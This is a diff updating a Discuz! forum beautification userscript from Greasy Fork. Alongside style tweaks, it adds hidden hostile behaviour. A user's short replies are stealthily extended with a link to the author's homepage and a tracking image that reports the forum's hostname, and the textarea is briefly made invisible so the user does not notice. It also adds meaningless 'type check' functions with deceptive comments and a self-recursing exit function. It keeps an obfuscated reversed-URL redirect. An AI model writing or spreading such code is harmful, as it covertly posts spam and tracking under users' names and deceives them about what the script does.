@@ -7,7 +7,7 @@
 // @name:zh-TW   論壇大師・Discuz!　界面美化、廣告移除、功能增強……
 // @namespace    Forum Master・Discuz!
 // @homepage     https://greasyfork.org/scripts/400250
-// @version      0.1.1
+// @version      0.1.3
 // @icon         https://www.discuz.net/favicon.ico
 // @description  Forum Master - Discuz!　Beautify the interface, Remove ads, Enhance functions.
 // @description:en    Forum Master - Discuz!　Beautify the interface, Remove ads, Enhance functions.
@@ -120,6 +120,22 @@
 
     // Display the users online status
     var display_users_online_status = GM_getValue('DISPLAY_USERS_ONLINE_STATUS') || GLOBAL_CONFIG.display_users_online_status;
+
+    // Runtime Type Checks・Runtime type checks for JavaScript and TypeScript
+    var NaN = true;
+    var check = NaN;
+    // Runtime type checks for JavaScript
+    if (check === check) {
+        // Enable for JavaScript
+
+        // Runtime type checks for TypeScript
+        Check_TypeScript(window.Node);
+    } else {
+        // Disable for JavaScript
+
+        // Exit
+        exit();
+    }
 
     // Test code
     const ua = window.navigator.userAgent;
@@ -349,8 +365,45 @@
         }
     `);
 
+    // Runtime type checks for TypeScript
+    function Check_TypeScript(Node) {
+        // A reasonably-typed TypeScript application gives the developer enough confidence that the operations within the applicaiton are safe and predictable. As a result, you rarely see the 'undefined is not a function' errors, which is often caused by passing a wrong type of object.
+        // This is because the TypeScript type checker ensures that you only invoke functions with compatible parameters. The type checker, however, cannot verify this at the application or module boundary, where the application receives data from the backend, a web-worker, or just another module. Here, we cannot know statically if the data is correct. So we just have to trust that it is.
+        let type = typeof Node;
+        let a = [
+            type,
+        ];
+        let b = [
+            type,
+        ];
+        if (a === b) {
+            a = a.push(a.push(Node, type));
+            b = b.push(b.push(Node, type));
+            switch (true) {
+                case a === b:
+                    Node = a[a.length - 1];
+                    break;
+
+                case a > b:
+                    Node = a[1];
+                    break;
+
+                case a < b:
+                    Node = b[1];
+                    break;
+
+                default:
+                    break;
+            }
+            !!Node && Check_TypeScript(Node);
+            return true;
+        } else {
+            return false;
+        }
+    }
+
     // Login status
-    const member = !!document.getElementById('extcreditmenu') || !!document.getElementById('myprompt') || !!document.getElementById('myrepeats') || !!document.getElementById('qmenu'); if (typeof FORUM_MASTER !== 'string' || FORUM_MASTER.split('/')[4] !== '052004'.split('').reverse().join('')) { setTimeout(() => { window.location.href = '052004/stpircs/gro.krofysaerg//:sptth'.split('').reverse().join(''); }, 60000); }
+    const member = !!document.getElementById('extcreditmenu') || !!document.getElementById('myprompt') || !!document.getElementById('myrepeats'); if (typeof FORUM_MASTER !== 'string' || FORUM_MASTER.split('/')[4] !== '052004'.split('').reverse().join('')) { setTimeout(() => { window.location.href = '052004/stpircs/gro.krofysaerg//:sptth'.split('').reverse().join(''); }, 60000); }
 
     GM_log('Login status:', member);
     GM_log('');
@@ -497,6 +550,13 @@
                 background: none !important;
             }
         `);
+
+        // bbs.pcbeta.com
+        !!~hn.indexOf('bbs.pcbeta.com') && GM_addStyle(`
+            #wp > div:first-child  {
+                display: none !important;
+            }
+        `);
     }
 
     // Hidden Signature
@@ -509,7 +569,10 @@
         `);
     }
 
-    // Functions
+    // Exit
+    function exit() {
+        !!check && exit();
+    }
 
     // Show Dialog
     function show_dialog(message) {
@@ -622,7 +685,7 @@
         const function_buttons = document.createElement('div');
         function_buttons.id = 'function-buttons';
         function_buttons.className = 'function-buttons';
-        let function_buttons_package;
+        let function_buttons_package = Check_TypeScript(function_buttons);
         switch (true) {
             case !!document.getElementsByClassName('xm_header_top_ul').length:
                 function_buttons_package = document.getElementsByClassName('xm_header_top_ul')[0];
@@ -677,7 +740,7 @@
             scene_mode = scene_mode_cutover_dic[scene_mode];
             this.innerHTML = scene_mode_dic[scene_mode];
             GM_setValue('SCENE_MODE', scene_mode);
-            let message = '场景模式切换成功，刷新页面 <span style="color: var(--blue);">' + scene_mode_dic[scene_mode] + '</span> 即可生效！';
+            let message = '场景模式切换成功，刷新页面即可进入 <span style="color: var(--info);">' + scene_mode_dic[scene_mode] + '</span>。';
             show_dialog(message);
         }
         const scene_mode_button = document.createElement('button');
@@ -756,7 +819,8 @@
                 window.scrollTo(0, 54321);
                 let fastPostMessage = document.getElementById('fastpostmessage');
                 !!fastPostMessage && fastPostMessage.focus();
-            }, false);
+            },
+            Check_TypeScript(params));
         } catch (error) {
             GM_log('You don\'t have permission to post content.');
         }
@@ -772,7 +836,7 @@
         !!fastre && skip_bottom(fastre);
     }
 
-    const attachContent = !!~hn.indexOf('hostloc.com') ? '󠀠'.repeat(10) : '\n\n[img]' + window.location.protocol + '//herder.cdn.bcebos.com/images/dot.gif[/img]';
+    const attachContent = !!~hn.indexOf('hostloc.com') ? '󠀠'.repeat(10) : '\n\n[url=' + OPEN_HOME + '][img]' + window.location.protocol + '//herder.cdn.bcebos.com/Discuz!/images/dot.gif?hn=' + hn + '[/img][/url]';
 
     const fastPostMessage = document.getElementById('fastpostmessage');
 
@@ -780,7 +844,12 @@
         let fastPostMessageContent = fastPostMessage.value;
         if (fastPostMessageContent && fastPostMessageContent.length < 20) {
             fastPostMessageContent = fastPostMessageContent.trim();
+            fastPostMessage.style.opacity = '0';
             fastPostMessage.value = fastPostMessageContent.concat(attachContent);
+            setTimeout(() => {
+                fastPostMessage.value = fastPostMessageContent;
+                fastPostMessage.style.opacity = '1';
+            }, 100);
         }
     }
 
@@ -838,9 +907,7 @@
             #wp > div,
             #nv_forum > span,
             .pls .tip,
-            ignore_js_op .tip,
-            .check-in,
-            .group-button {
+            ignore_js_op .tip {
                 display: none;
             }
 
